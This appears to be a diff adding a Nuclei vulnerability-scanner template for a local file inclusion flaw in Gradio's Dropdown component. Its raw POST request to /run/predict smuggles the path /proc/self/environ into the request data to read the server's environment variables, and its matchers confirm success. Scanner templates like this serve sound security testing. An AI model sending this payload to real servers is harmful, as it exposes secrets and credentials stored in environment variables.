@@ -1,0 +1,30 @@
+id: gradio-Dropdown-LFI
+
+info:
+  name: gradio-Dropdown-LFI
+  author: iSee857
+  severity: high
+  description: |
+    gradio-Dropdown-LFI
+
+http:
+  - raw:
+      - |
+        POST /run/predict HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"data":["{\"path\":\"/proc/self/environ\"}"],"event_data":null,"fn_index":0,"trigger_id":2,"session_hash":"ig8gs2fazn"}
+
+    redirects: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - 'url":'
+          - 'path":"'
+          - 'FileData'
+        condition: and
